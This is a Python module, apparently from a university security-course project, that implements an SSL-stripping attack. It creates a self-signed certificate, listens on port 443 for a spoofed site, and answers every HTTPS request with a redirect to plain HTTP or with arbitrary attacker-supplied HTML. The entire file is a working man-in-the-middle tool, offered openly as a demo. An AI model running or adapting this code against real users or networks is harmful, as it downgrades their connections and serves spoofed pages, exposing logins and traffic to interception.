"""
Simple SSL stripping demo: listen on 443 with a self-signed cert and 301 redirect to HTTP.
Mirrors the working logic from the 2IC80 project.
"""

import http.server
import errno
import os
import socketserver
import ssl
import subprocess
from typing import Optional

from scapy.all import conf, get_if_addr


class SSLStripper:
    """
    Mirror the original 2IC80 SSL stripping flow: prep cert, bind to 443, redirect to HTTP or serve HTML.
    """

    # Store interface/bind_ip/site_to_spoof and optional html_body for the listener.
    def __init__(
        self,
        interface: str,
        bind_ip: str,
        site_to_spoof: str,
        fallback_ip: Optional[str] = None,
        html_body: Optional[str] = None,
    ):
        # Store runtime configuration so the handler can refer to it later.
        self.interface = interface
        self.bind_ip = bind_ip
        self.site_to_spoof = site_to_spoof
        self.cert_file = "/tmp/sslstrip_cert.pem"
        self.key_file = "/tmp/sslstrip_key.pem"
        self.fallback_ip = fallback_ip if fallback_ip != bind_ip else None
        self.html_body = html_body

    # Generate certs and start the HTTPS server, falling back to interface IP if needed.
    def strip(self) -> None:
        print("[*] SSL STRIP DEMO")
        print(f"[i] Interface: {self.interface}")
        print(f"[i] Binding HTTPS redirector on {self.bind_ip}:443")
        if self.html_body is None:
            print(f"[i] Redirect target: http://{self.site_to_spoof}")
        else:
            print("[i] Serving custom HTML response instead of redirect")

        ensure_self_signed_cert(self.cert_file, self.key_file)

        try:
            self._start_server(self.bind_ip)
        except OSError as exc:
            # Retry with a known-good interface IP if a user-specified bind IP is wrong.
            if exc.errno == errno.EADDRNOTAVAIL and self.fallback_ip:
                print(f"[!] Cannot bind to {self.bind_ip} on {self.interface}; falling back to {self.fallback_ip}.")
                try:
                    self._start_server(self.fallback_ip)
                except OSError as inner_exc:
                    print(f"[!] Failed to start HTTPS redirector on fallback {self.fallback_ip}: {inner_exc}")
                except KeyboardInterrupt:
                    print("\n[i] Stopping SSL strip demo.")
            elif exc.errno == errno.EACCES:
                print("[!] Permission denied binding to port 443. Run with sudo/root or choose a higher port.")
            else:
                print(f"[!] Failed to start HTTPS redirector: {exc}")
        except KeyboardInterrupt:
            print("\n[i] Stopping SSL strip demo.")

    # Start the HTTPS redirect/HTML server bound to ip using current SSLStripper state.
    def _start_server(self, ip: str) -> None:
        # Delegate to the common server helper with the current HTML/redirect mode.
        start_https_redirect_server(ip, self.site_to_spoof, self.cert_file, self.key_file, self.html_body)


class _RedirectHandler(http.server.BaseHTTPRequestHandler):
    target_host: Optional[str] = None
    response_html: Optional[str] = None

    # Override BaseHTTPRequestHandler logging to keep output quiet.
    def log_message(self, format, *args):
        # Silence default HTTP server logging.
        return

    # Serve HTML if configured; otherwise 301 redirect to http://target_host.
    def do_GET(self):
        # If custom HTML is configured, serve it; otherwise issue a 301 redirect.
        if self.response_html is not None:
            body = self.response_html.encode("utf-8")
            print(f"[i] Serving SSL strip HTML to {self.client_address[0]}")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        print(f"[i] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}")
        self.send_response(301)
        self.send_header("Location", f"http://{self.target_host}")
        self.end_headers()

    # Treat POST like GET for a simple demo flow.
    def do_POST(self):
        # Treat POST the same as GET for a simple demo.
        self.do_GET()


# Choose interface from provided_iface/SCAPY_IFACE/Scapy default.
def _select_iface(provided_iface: Optional[str]) -> str:
    # Prefer explicit CLI, then env override, then Scapy default.
    if provided_iface:
        return provided_iface
    env_iface = os.environ.get("SCAPY_IFACE")
    if env_iface:
        return env_iface
    return conf.iface


# Resolve bind IP from provided_ip or from the interface address via Scapy.
def _resolve_bind_ip(iface: str, provided_ip: Optional[str]) -> Optional[str]:
    # If user provides a bind IP, trust it; otherwise ask Scapy for the iface address.
    if provided_ip:
        return provided_ip
    try:
        return get_if_addr(iface)
    except Exception:
        return None


# Create a short-lived self-signed cert if cert_file/key_file are missing.
def ensure_self_signed_cert(cert_file: str, key_file: str) -> None:
    # Generate a short-lived self-signed cert if one is not already present.
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-keyout",
            key_file,
            "-out",
            cert_file,
            "-days",
            "1",
            "-nodes",
            "-subj",
            "/CN=sslstrip",
        ],
        check=False,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


# Ensure HTML content is a complete document (wrap if it's just text/fragment).
def _normalize_html_body(html_body: str) -> str:
    # Ensure we return a full HTML document even if the input is plain text.
    normalized = html_body.strip()
    lower = normalized.lower()
    if "<html" in lower or "<!doctype" in lower:
        return normalized
    # Wrap plain text/fragment into a minimal HTML document.
    return (
        "<!doctype html>"
        "<html lang=\"en\">"
        "<head><meta charset=\"utf-8\"><title>SSL Strip</title></head>"
        "<body>"
        f"{normalized}"
        "</body></html>"
    )


# Bind to 443 with TLS and handle HTTPS requests via _RedirectHandler.
def start_https_redirect_server(
    bind_ip: str,
    site_to_spoof: str,
    cert_file: str,
    key_file: str,
    html_body: Optional[str] = None,
) -> None:
    # Share request-specific state with the handler via class variables.
    _RedirectHandler.target_host = site_to_spoof
    _RedirectHandler.response_html = html_body
    # TCPServer binds a socket; allow_reuse_address reduces "Address already in use" on restart.
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer((bind_ip, 443), _RedirectHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # Wrap the server socket with TLS so clients see an HTTPS endpoint.
    context.load_cert_chain(certfile=cert_file, keyfile=key_file)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    if html_body is None:
        print(f"[i] Listening on {bind_ip}:443 and redirecting to http://{site_to_spoof}")
    else:
        print(f"[i] Listening on {bind_ip}:443 and serving custom HTML")
    httpd.serve_forever()


# CLI entry point: resolve iface/bind IP and start the SSLStripper.
def run(
    site_to_spoof: str,
    bind_ip: Optional[str] = None,
    iface: Optional[str] = None,
    html_body: Optional[str] = None,
    html_file: Optional[str] = None,
) -> None:
    """
    Start an HTTPS listener that strips SSL by redirecting to HTTP or serving custom HTML.
    """
    chosen_iface = _select_iface(iface)
    # Resolve interface IP once so we can fallback if a custom bind IP fails.
    iface_ip = _resolve_bind_ip(chosen_iface, None)
    resolved_bind_ip = bind_ip or iface_ip
    if not resolved_bind_ip:
        print("[!] Could not determine bind IP. Provide --bind-ip or choose a valid interface.")
        return

    fallback_ip = iface_ip if bind_ip and iface_ip and iface_ip != resolved_bind_ip else None
    resolved_html: Optional[str] = None
    if html_file:
        try:
            with open(html_file, "r", encoding="utf-8") as handle:
                resolved_html = handle.read()
        except OSError as exc:
            print(f"[!] Failed to read HTML file '{html_file}': {exc}")
            return
    elif html_body:
        resolved_html = html_body
    if resolved_html:
        # Normalize user input so the handler can send a complete HTML page.
        resolved_html = _normalize_html_body(resolved_html)
    SSLStripper(
        interface=chosen_iface,
        bind_ip=resolved_bind_ip,
        site_to_spoof=site_to_spoof,
        fallback_ip=fallback_ip,
        html_body=resolved_html,
    ).strip()
